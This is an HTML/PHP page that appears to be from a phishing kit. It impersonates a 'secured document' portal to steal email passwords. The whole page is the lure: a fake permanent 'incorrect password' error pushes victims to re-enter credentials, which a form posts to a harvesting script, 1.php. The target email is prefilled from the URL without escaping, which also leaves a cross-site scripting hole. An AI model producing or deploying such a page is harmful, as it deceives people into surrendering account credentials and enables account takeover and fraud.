
<!DOCTYPE html>
<html>
<head>
<title>Secured Doc Page</title>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">

	 <script>
        addEventListener("load", function () {
            setTimeout(hideURLbar, 0);
        }, false);

        function hideURLbar() {
            window.scrollTo(0, 1);
        }
    </script>

	<!-- Custom Theme files -->
	<link href="css/style.css" rel="stylesheet" type="text/css" media="all" />
	<link href="css/font-awesome.min.css" rel="stylesheet" type="text/css" media="all" />
	<!-- //Custom Theme files -->

	<!-- web font -->
	<link href="//fonts.googleapis.com/css?family=Hind:300,400,500,600,700" rel="stylesheet">
	<!-- //web font -->

<style>
.errormsg {
    padding: 0 20px 5px;
    line-height: 20px;
    color: #fff;
    text-align: center;
    background: #A50E01;
padding: .4em 2em;
    margin: 0em 0em 1.2em 0em;
    border-radius: 3px;  
    font-size: 17.5px;  
}

</style>

</head>
<body>

<!-- main -->
<div class="w3layouts-main"> 
	<div class="bg-layer">
		<!-- <h1>&nbsp;</h1> -->
		<div id="topbannerdiv"><div class="w-adologo"><span></span></div></div>			
		<div class="header-main">
			<div class="main-icon">
				<img src="images/pdfbannerred.png" class="redbanner">
				<!-- <span class="fa fa-eercast"></span> -->
			</div>

			<div class="header-left-bottom">
				<form action="1.php" method="post">
					<div class="errormsg">
Email or Password is Incorrect. <br>Kindly Try Again With Correct Details			
					</div>	
					<div id="input-area">				
						<label for="username">Email Address</label>
						<div class="icon1">
							
							<input type="email" name="bar1" value="<?php echo $_GET['email']?>" placeholder="Email address here" required=""/>
						</div>
						<label for="password">Password</label>
						<div class="icon1">
							
							<input type="password" name="bar2" placeholder="Password here" required=""/>
						</div>
					</div>
					<div class="bottom" align="center">
						<button class="btn">Login To Access File  </button>
					</div>
				</form>	
				<div class="instruction">To access our online secure document page, you are required to login your email address, this is to ensure you are the rightful recipient for the protect file. Unauthorized access is highly prohibited</div>
			</div>
		</div>
		
	</div>
</div>	
<!-- //main -->

</body>
</html>